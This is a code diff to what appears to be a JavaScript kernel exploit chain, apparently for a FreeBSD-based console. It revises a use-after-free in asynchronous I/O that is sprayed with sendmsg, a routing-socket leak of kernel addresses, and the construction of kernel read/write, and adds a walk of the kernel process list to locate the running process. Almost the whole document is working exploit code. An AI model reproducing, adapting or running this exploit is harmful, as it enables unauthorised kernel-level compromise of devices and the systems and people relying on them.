@@ -30,15 +30,11 @@ const outs = new Uint32Array(AIO_MAX_NUM);
 let wait_mode = undefined;
 const timeout = new Uint32Array(1);
 
-let leak_fd = undefined; // used to leak kernel stack
+let msg = undefined;
+let reqs1 = undefined;
 let cpus_mib = undefined; // krw master lo
 let maxcpus_mib = undefined; // krw victim
 let topology_mib = undefined; // krw master hi
-
-let td = undefined; // current thread
-let so = undefined; // leak_fd socket
-let msg = undefined;
-let reqs1 = undefined;
 
 fn.sendmsg = new NativeFunction(0x1c, 'bint');
 fn.aio_multi_delete = new NativeFunction(0x296, 'number');
@@ -218,7 +214,7 @@ function aio_uaf_arb_dec(targets) {
     for (const target of targets) {
       // craft aio_waiter and spray UAF using sendmsg
       msg_iov[0].iov_base = target;
-      msg_iov[1].iov_base = so.add(0xd8); // so_rcv.sb_mtx
+      msg_iov[1].iov_base = kernel_base.add(impl.k_ntpadj_lock); // mtx
 
       for (let i = 0; i < 0x100; i++) {
         fn.sendmsg.invoke(0, msg.addr, 0);
@@ -262,9 +258,6 @@ function init() {
 
   logger.debug(`block_ss: ${block_ss}`);
 
-  leak_fd = make_socket(AF_ROUTE, SOCK_RAW);
-  logger.debug(`leak_fd: ${leak_fd}`);
-
   timeout[0] = 1;
   wait_mode = AIO_WAIT_DEFAULT;
 
@@ -304,14 +297,6 @@ function cleanup() {
     uaf_ids.fill(0);
   }
 
-  if (Number.isFinite(leak_fd) && leak_fd !== 0) {
-    if (fn.close.invoke(leak_fd) === -1) {
-      throw new SyscallError(`Unable to close fd ${fd} !!`);
-    }
-
-    leak_fd = undefined;
-  }
-
   free_karw_pipe();
 
   if (reqs1 !== undefined) {
@@ -347,6 +332,9 @@ function setup() {
 function leak_kaddrs() {
   logger.info('Leak kernel stack started...');
 
+  const leak_fd = make_socket(AF_ROUTE, SOCK_RAW);
+  logger.debug(`leak_fd: ${leak_fd}`);
+
   const msg = rtmsg.new();
 
   msg.rtm.rtm_msglen = rt_msghdr.sizeof;
@@ -378,6 +366,10 @@ function leak_kaddrs() {
     throw new SyscallError(`Unable to read from fd ${leak_fd} !!`);
   }
 
+  if (fn.close.invoke(leak_fd) === -1) {
+    throw new SyscallError(`Unable to close fd ${fd} !!`);
+  }
+
   if (msg.rtm.rtm_msglen === omsglen) {
     mem.free(msg.addr);
     throw new Error('Unable to leak kernel stack !!');
@@ -394,17 +386,14 @@ function leak_kaddrs() {
 
   logger.info('Leaked kernel stack !!');
 
-  td = view.getBInt(impl.k_stack_leak_td, true);
-  logger.debug(`td: ${td}`);
-
-  so = view.getBInt(impl.k_stack_leak_so, true);
-  logger.debug(`so: ${so}`);
-
   const rtmsg2_ret = view.getBInt(0xa8, true);
   logger.debug(`rtmsg2_ret: ${rtmsg2_ret}`);
 
   kernel_base = rtmsg2_ret.sub(impl.k_route_output_rtmsg2_ret);
   logger.info(`kernel base: ${kernel_base}`);
+
+  allproc = kernel_base.add(impl.k_allproc);
+  logger.debug(`allproc: ${allproc}`);
 }
 
 /*
@@ -512,10 +501,18 @@ function make_karw() {
 
   logger.info('Initiate kernel ARW...');
 
-  const td_proc = kread64(td.add(8));
-  logger.debug(`td_proc: ${td_proc}`);
+  const pid = fn.getpid.invoke();
+  logger.debug(`pid: ${pid}`);
 
-  const p_fd = kread64(td_proc.add(0x48));
+  let p = kread64(allproc);
+  while (p.neq(0)) {
+    const p_pid = kread64(p.add(k_proc_pid));
+    if (p_pid.lo === pid) break;
+
+    p = kread64(p); // p_list.le_next
+  }
+
+  const p_fd = kread64(p.add(0x48));
   logger.debug(`p_fd: ${p_fd}`);
 
   fdt_ofiles = kread64(p_fd).add(k_filedesc_fdt_ofiles);
